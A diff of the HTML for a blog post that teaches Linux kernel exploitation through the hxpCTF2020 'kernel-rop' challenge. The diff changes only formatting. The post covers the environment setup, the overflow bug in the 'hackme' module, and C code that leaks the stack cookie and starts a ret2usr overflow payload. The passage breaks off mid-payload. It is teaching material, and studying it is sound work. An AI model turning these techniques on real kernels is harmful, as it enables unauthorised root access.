@@ -9,8 +9,8 @@
 <meta property="og:description" content="The first part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Setting up the environment and the simplest technique of ret2usr" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" /><meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-01-23T16:33:12&#43;07:00" />
-<meta property="article:modified_time" content="2021-01-23T16:33:12&#43;07:00" />
+<meta property="article:published_time" content="2021-01-23T16:33:12+07:00" />
+<meta property="article:modified_time" content="2021-01-23T16:33:12+07:00" />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>
@@ -162,24 +162,24 @@
 <p>Let&rsquo;s take a deeper look at each of these files to find out what we should do with them, one by one.</p>
 <h3 id="the-kernel">The kernel</h3>
 <p>The Linux kernel, which is often given under the name of <a href="/posts/20210123-linux-kernel-pwn-part-1/vmlinuz" rel="">vmlinuz</a> or <code>bzImage</code>, is the compressed version of the kernel image called <code>vmlinux</code>. There can be some different compression schemes that are used like <code>gzip</code>, <code>bzip2</code>, <code>lzma</code>, etc. Here I used a script called <a href="/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh" rel="">extract-image.sh</a> to extract the kernel ELF file:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./extract-image.sh ./vmlinuz &gt; vmlinux
-</code></pre></div><p>The reason for extracting the kernel image is to find <code>ROP gadgets</code> inside it. If you are already familiar with userland pwning, you know what <code>ROP</code> is, and in the kernel, it&rsquo;s not much different (we will see in later posts). I personally prefer using <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreffer">ROPgadget</a> to do the job:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ROPgadget --binary ./vmlinux &gt; gadgets.txt
-</code></pre></div><p>Keep in mind that unlike a simple userland program, the kernel image is <strong>HUGE</strong>. Therefore, <code>ROPgadget</code> will take a very long time finding all the gadgets and you have to just wait for it, so it is wise to immediately look for gadgets at the beginning of the pwning process. It is also wise to save the output into a file, you don&rsquo;t want to run <code>ROPgadget</code> multiple times to look for multiple different gadgets.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./extract-image.sh ./vmlinuz &gt; vmlinux
+</span></span></code></pre></div><p>The reason for extracting the kernel image is to find <code>ROP gadgets</code> inside it. If you are already familiar with userland pwning, you know what <code>ROP</code> is, and in the kernel, it&rsquo;s not much different (we will see in later posts). I personally prefer using <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreffer">ROPgadget</a> to do the job:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ROPgadget --binary ./vmlinux &gt; gadgets.txt
+</span></span></code></pre></div><p>Keep in mind that unlike a simple userland program, the kernel image is <strong>HUGE</strong>. Therefore, <code>ROPgadget</code> will take a very long time finding all the gadgets and you have to just wait for it, so it is wise to immediately look for gadgets at the beginning of the pwning process. It is also wise to save the output into a file, you don&rsquo;t want to run <code>ROPgadget</code> multiple times to look for multiple different gadgets.</p>
 <h3 id="the-file-system">The file system</h3>
 <p>Again, this is a compressed file, I use this script <a href="/posts/20210123-linux-kernel-pwn-part-1/decompress.sh" rel="">decompress.sh</a> to decompress the file:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">mkdir initramfs
-<span class="nb">cd</span> initramfs
-cp ../initramfs.cpio.gz .
-gunzip ./initramfs.cpio.gz
-cpio -idm &lt; ./initramfs.cpio
-rm initramfs.cpio
-</code></pre></div><p>After running the script, we have a directory <code>initramfs</code> which looks like the root directory of a file system on a Linux machine. We can also see that in this case, the vulnearable kernel module <a href="/posts/20210123-linux-kernel-pwn-part-1/hackme.ko" rel="">hackme.ko</a> is also included in the root directory, we will copy it to somewhere else to analyze later.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir initramfs
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> initramfs
+</span></span><span class="line"><span class="cl">cp ../initramfs.cpio.gz .
+</span></span><span class="line"><span class="cl">gunzip ./initramfs.cpio.gz
+</span></span><span class="line"><span class="cl">cpio -idm &lt; ./initramfs.cpio
+</span></span><span class="line"><span class="cl">rm initramfs.cpio
+</span></span></code></pre></div><p>After running the script, we have a directory <code>initramfs</code> which looks like the root directory of a file system on a Linux machine. We can also see that in this case, the vulnearable kernel module <a href="/posts/20210123-linux-kernel-pwn-part-1/hackme.ko" rel="">hackme.ko</a> is also included in the root directory, we will copy it to somewhere else to analyze later.</p>
 <p>The reason we decompress this file is not only to get the vulnearable module, but also to modify something in this file system to our need. Firstly, we can look into <code>/etc</code> directory, because most of the init scripts that are run after booting is stored here. In particular, we look for the following line in one of the files (usually it will be <code>rcS</code> or <code>inittab</code>) and then modify it:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">setuidgid <span class="m">1000</span> /bin/sh
-<span class="c1"># Modify it into the following</span>
-setuidgid <span class="m">0</span> /bin/sh
-</code></pre></div><p>The purpose of this line is to spawn a <strong>non-root shell</strong> with UID <code>1000</code> after booting. After modifying the UID to <code>0</code>, we will have a <strong>root shell</strong> on startup. You may ask: <em>why should we do this?</em> Indeed, this seems quite contradictory, because our goal is to exploit the kernel module to gain root, not to modify the file system (of course we cannot modify the file system on the challenge&rsquo;s remote server). The ultimate reason here is just to simplify the exploitation process. There are some files that contain useful information for us when developing the exploitation code, but they require root access to read, for example:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">setuidgid <span class="m">1000</span> /bin/sh
+</span></span><span class="line"><span class="cl"><span class="c1"># Modify it into the following</span>
+</span></span><span class="line"><span class="cl">setuidgid <span class="m">0</span> /bin/sh
+</span></span></code></pre></div><p>The purpose of this line is to spawn a <strong>non-root shell</strong> with UID <code>1000</code> after booting. After modifying the UID to <code>0</code>, we will have a <strong>root shell</strong> on startup. You may ask: <em>why should we do this?</em> Indeed, this seems quite contradictory, because our goal is to exploit the kernel module to gain root, not to modify the file system (of course we cannot modify the file system on the challenge&rsquo;s remote server). The ultimate reason here is just to simplify the exploitation process. There are some files that contain useful information for us when developing the exploitation code, but they require root access to read, for example:</p>
 <ul>
 <li><code>/proc/kallsyms</code> lists all the addresses of all symbols loaded into the kernel.</li>
 <li><code>/sys/module/core/sections/.text</code> shows the address of kernel <code>.text</code> section, which is also its base address (even though in the case of this challenge, there is no such <code>/sys</code> directory, you can still retrieve the base address from <code>/proc/kallsyms</code> though).</li>
@@ -193,28 +193,28 @@ setuidgid <span class="m">0</span> /bin/sh
         </div>
     </div>
 <p>Secondly, we decompress the file system to put our exploitation program into it later. After modifying it, I use this script <a href="/posts/20210123-linux-kernel-pwn-part-1/compress.sh" rel="">compress.sh</a> to compress it back into the given format:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">gcc -o exploit -static <span class="nv">$1</span>
-mv ./exploit ./initramfs
-<span class="nb">cd</span> initramfs
-find . -print0 <span class="se">\
-</span><span class="se"></span><span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
-</span><span class="se"></span><span class="p">|</span> gzip -9 &gt; initramfs.cpio.gz
-mv ./initramfs.cpio.gz ../
-</code></pre></div><p>The first 2 lines are to compile the exploitation code and put it into the file system.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -o exploit -static <span class="nv">$1</span>
+</span></span><span class="line"><span class="cl">mv ./exploit ./initramfs
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> initramfs
+</span></span><span class="line"><span class="cl">find . -print0 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> gzip -9 &gt; initramfs.cpio.gz
+</span></span><span class="line"><span class="cl">mv ./initramfs.cpio.gz ../
+</span></span></code></pre></div><p>The first 2 lines are to compile the exploitation code and put it into the file system.</p>
 <h3 id="the-qemu-run-script">The qemu run script</h3>
 <p>Initially, the given <a href="/posts/20210123-linux-kernel-pwn-part-1/run.sh" rel="">run.sh</a> looks like this:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">qemu-system-x86_64 <span class="se">\
-</span><span class="se"></span>    -m 128M <span class="se">\
-</span><span class="se"></span>    -cpu kvm64,+smep,+smap <span class="se">\
-</span><span class="se"></span>    -kernel vmlinuz <span class="se">\
-</span><span class="se"></span>    -initrd initramfs.cpio.gz <span class="se">\
-</span><span class="se"></span>    -hdb flag.txt <span class="se">\
-</span><span class="se"></span>    -snapshot <span class="se">\
-</span><span class="se"></span>    -nographic <span class="se">\
-</span><span class="se"></span>    -monitor /dev/null <span class="se">\
-</span><span class="se"></span>    -no-reboot <span class="se">\
-</span><span class="se"></span>    -append <span class="s2">&#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;</span>
-</code></pre></div><p>Some notable flags are:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -m 128M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -cpu kvm64,+smep,+smap <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -kernel vmlinuz <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -initrd initramfs.cpio.gz <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -hdb flag.txt <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -snapshot <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -nographic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -no-reboot <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -append <span class="s2">&#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;</span>
+</span></span></code></pre></div><p>Some notable flags are:</p>
 <ul>
 <li><code>-m</code> specifies the memory size, if for some reasons you cannot boot the emulator, you can try increase this size.</li>
 <li><code>-cpu</code> specifies the CPU model, here we can add <code>+smep</code> and <code>+smap</code> for SMEP and SMAP mitigation features (more on this later).</li>
@@ -232,9 +232,9 @@ mv ./initramfs.cpio.gz ../
         </div>
     </div>
 <p>The first thing that should be done here is to add <code>-s</code> option to it. This options allows us to debug the emulator&rsquo;s kernel remotely from our host machine. All we need to do is to boot the emulator up like normal, then in the host machine, run:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ gdb vmlinux
-<span class="o">(</span>gdb<span class="o">)</span> target remote localhost:1234
-</code></pre></div><p>Then, we can debug the system&rsquo;s kernel normally, just like when we attach <code>gdb</code> to a normal userland process.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gdb vmlinux
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> target remote localhost:1234
+</span></span></code></pre></div><p>Then, we can debug the system&rsquo;s kernel normally, just like when we attach <code>gdb</code> to a normal userland process.</p>
 <div class="details admonition tip open">
         <div class="details-summary admonition-title">
             <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
@@ -257,39 +257,39 @@ mv ./initramfs.cpio.gz ../
 <h2 id="analyzing-the-kernel-module">Analyzing the kernel module</h2>
 <p>The module is absolutely simple. First, in <code>hackme_init()</code>, it registers a device named <code>hackme</code> with the following operations: <code>hackme_read</code>, <code>hackme_write</code>, <code>hackme_open</code> and <code>hackme_release</code>. This means that we can communicate with this module by opening <code>/dev/hackme</code> and perform read or write on it.</p>
 <p>Performing read or write on the device will make a call to <code>hackme_read()</code> or <code>hackme_write()</code> in the kernel, their code is as follow (using IDA pro, some irrelevant parts are omitted):</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
-<span class="p">{</span>   
-    <span class="c1">//...
-</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-    <span class="c1">//...
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
-        <span class="n">BUG</span><span class="p">();</span>
-    <span class="p">}</span>
-    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
-        <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
-    <span class="n">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
-    <span class="c1">//...
-</span><span class="c1"></span><span class="p">}</span>
-
-<span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
-<span class="p">{</span>   
-    <span class="c1">//...
-</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-    <span class="c1">//...
-</span><span class="c1"></span>    <span class="n">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
-        <span class="n">BUG</span><span class="p">();</span>
-    <span class="p">}</span>
-    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
-    <span class="n">v6</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="c1">//...
-</span><span class="c1"></span><span class="p">}</span>
-</code></pre></div><p>The bugs in these 2 functions are pretty clear: They both read/write to a stack buffer that is 0x80 bytes in length, but only alert a buffer overflow if the size is larger than 0x1000. Using this bug, we can freely read from/write to the kernel stack.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>   
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BUG</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>   
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BUG</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>The bugs in these 2 functions are pretty clear: They both read/write to a stack buffer that is 0x80 bytes in length, but only alert a buffer overflow if the size is larger than 0x1000. Using this bug, we can freely read from/write to the kernel stack.</p>
 <p>Now, let&rsquo;s see what we can do with the above primitives to achieve root privileges, starting with the least mitigation features possible: only <code>stack cookies</code>.</p>
 <h2 id="the-simplest-exploit---ret2usr">The simplest exploit - ret2usr</h2>
 <h3 id="concept">Concept</h3>
@@ -299,71 +299,71 @@ mv ./initramfs.cpio.gz ../
 <p>Since this is the first technique in the series, I will explain the exploitation process step by step.</p>
 <h3 id="opening-the-device">Opening the device</h3>
 <p>First of all, before we can interact with the module, we have to open it first. The function to open the device is as simple as open a normal file:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>
-
-<span class="kt">void</span> <span class="nf">open_dev</span><span class="p">(){</span>
-    <span class="n">global_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
-		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
-		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div><p>After doing this, we can now read and write to <code>global_fd</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">open_dev</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">global_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>After doing this, we can now read and write to <code>global_fd</code>.</p>
 <h3 id="leaking-stack-cookies">Leaking stack cookies</h3>
 <p>Because we have arbitrary stack read, leaking is trivial. The <code>tmp</code> buffer on the stack itself is 0x80 bytes long, and the stack cookie is immediately after it. Therefore, if we read the data to a <code>unsigned long</code> array (of which each element is 8 bytes), the cookie will be at offset 16:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cookie</span><span class="p">;</span>
-
-<span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
-    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
-    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><h3 id="overwriting-return-address">Overwriting return address</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="overwriting-return-address">Overwriting return address</h3>
 <p>The situation here is the same as leaking, we will create an <code>unsigned long</code> array, then overwrite the cookie with our leaked cookie at index 16. The important thing to note here is that different from <code>userland</code> programs, this kernel function actually pops 3 registers from the stack, namely <code>rbx</code>, <code>r12</code>, <code>rbp</code> instead of just <code>rbp</code> (this can clearly be seen in the disassembly of the functions). Therefore, we have to put 3 dummy values after the cookie. Then the next value will be the return address that we want our program to return into, which is the function that we will craft on the <code>userland</code> to achieve root privileges, I called it <code>escalate_privs</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
-    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
